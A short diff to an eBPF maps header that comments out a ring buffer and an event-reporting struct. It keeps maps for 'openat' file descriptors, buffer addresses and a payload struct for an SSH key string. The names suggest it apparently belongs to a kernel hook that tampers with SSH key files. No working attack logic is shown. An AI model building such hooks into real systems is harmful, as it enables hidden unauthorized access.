@@ -3,11 +3,14 @@
 #define __MAPS__
 
 // Ringbuffer Map to pass messages from kernel to user
+// No Event Struct no Ringbuffer.
+/*
 struct
 {
     __uint(type, BPF_MAP_TYPE_RINGBUF);
     __uint(max_entries, 256 * 1024);
 } rb SEC(".maps");
+*/
 
 // Map to hold the File Descriptors from 'openat' calls
 struct
@@ -36,6 +39,7 @@ struct
 } map_buff_addrs SEC(".maps");
 
 // Report Events
+/*
 struct event
 {
     int pid;
@@ -44,6 +48,7 @@ struct event
 };
 // const struct event *unused UNUSED;
 __EXPORTED_DEFINE(event, unused1);
+*/
 
 // struct defined custom_payload to get usermode ssh key string
 struct custom_payload
